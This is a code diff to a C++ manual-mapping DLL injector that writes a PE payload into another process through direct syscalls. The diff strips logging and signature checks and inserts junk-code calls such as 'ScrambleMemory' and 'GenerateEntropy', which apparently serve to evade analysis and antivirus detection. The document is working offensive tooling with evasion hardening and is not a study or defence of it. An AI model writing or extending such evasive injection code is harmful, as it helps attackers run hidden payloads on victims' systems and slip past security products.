@@ -1,6 +1,7 @@
 #include "Injector.h"
 #include "Syscalls.h"
 #include "NtStructs.h"
+#include "JunkLogic.h"
 #include "../utils/Logger.h"
 #include "../utils/Shared.h"
 #include "../utils/Obfuscator.h"
@@ -19,31 +20,20 @@ namespace {
 }
 
 bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID* ppRemoteBase) {
-    LOG_INFO("MapAndInject: Starting manual mapping...");
+    JunkLogic::PerformComplexMath();
 
     PBYTE pSrcData = (PBYTE)payload.data();
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
-    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-        LOG_ERR("MapAndInject: Invalid DOS signature.");
-        return false;
-    }
-
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
-    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
-        LOG_ERR("MapAndInject: Invalid NT signature.");
-        return false;
-    }
 
     PVOID pTargetBase = NULL;
     SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
 
     // 1. Allocate memory in target process
     NTSTATUS status = SysNtAllocateVirtualMemory(hProcess, &pTargetBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!NT_SUCCESS(status)) {
-        LOG_ERR("MapAndInject: NtAllocateVirtualMemory failed. Status: " + utils::Shared::ToHex((unsigned long long)status));
-        return false;
-    }
-    LOG_INFO("MapAndInject: Allocated " + std::to_string(imageSize) + " bytes at " + utils::Shared::ToHex((unsigned long long)pTargetBase));
+    if (!NT_SUCCESS(status)) return false;
+
+    JunkLogic::GenerateEntropy();
 
     // 2. Map sections to a local buffer first for easier processing
     std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage, 0);
@@ -60,6 +50,8 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
         PVOID pSrc = pSrcData + pSectionHeader[i].PointerToRawData;
         memcpy(pDest, pSrc, pSectionHeader[i].SizeOfRawData);
     }
+
+    JunkLogic::ScrambleMemory();
 
     // 3. Process Relocations
     DWORD_PTR delta = (DWORD_PTR)pTargetBase - pNtHeaders->OptionalHeader.ImageBase;
@@ -85,6 +77,8 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
             }
         }
     }
+
+    JunkLogic::PerformComplexMath();
 
     // 4. Resolve Imports
     auto& importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
@@ -132,9 +126,10 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
         }
     }
 
+    JunkLogic::GenerateEntropy();
+
     // 5. Write the processed image to the target process
     if (!NT_SUCCESS(SysNtWriteVirtualMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL))) {
-        LOG_ERR("MapAndInject: SysNtWriteVirtualMemory failed.");
         return false;
     }
 
@@ -161,7 +156,6 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
     }
 
     if (ppRemoteBase) *ppRemoteBase = pTargetBase;
-    LOG_INFO("MapAndInject: Success.");
     return true;
 }
 
